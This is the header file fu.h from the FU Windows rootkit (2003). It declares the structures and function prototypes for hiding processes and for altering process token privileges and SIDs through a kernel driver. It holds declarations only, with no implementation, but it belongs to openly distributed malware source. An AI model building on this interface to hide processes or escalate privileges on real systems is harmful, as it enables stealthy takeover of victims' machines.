///////////////////////////////////////////////////////////////////////////////////////
// Filename fu.h
// 
// Author: fuzen_op
// Email:  fuzen_op@yahoo.com or fuzen_op@rootkit.com
//
// Description: fu.h has prototypes, etc. that fu.cpp needs.
//
// Date:    5/27/2003
// Version: 1.0

static BOOL Initialized = FALSE;
HANDLE gh_Device = INVALID_HANDLE_VALUE;

typedef struct _vars {
	DWORD the_pid;
	PLUID_AND_ATTRIBUTES pluida;
	DWORD num_luids;
} VARS;


typedef struct _vars2 {
	DWORD the_pid;
	void * pSID;
	DWORD d_SidSize;
} VARS2;

DWORD Init();
DWORD ListProc(IN void *, IN int);
DWORD HideProc(IN char *, IN int);
DWORD HideProcNG(DWORD pid);
DWORD ListAuthID(IN void *, IN int);
DWORD SetPriv(IN char *, IN void *, IN int);

int	  ListPriv(void);
DWORD SetSid(IN DWORD, IN PSID, IN DWORD);
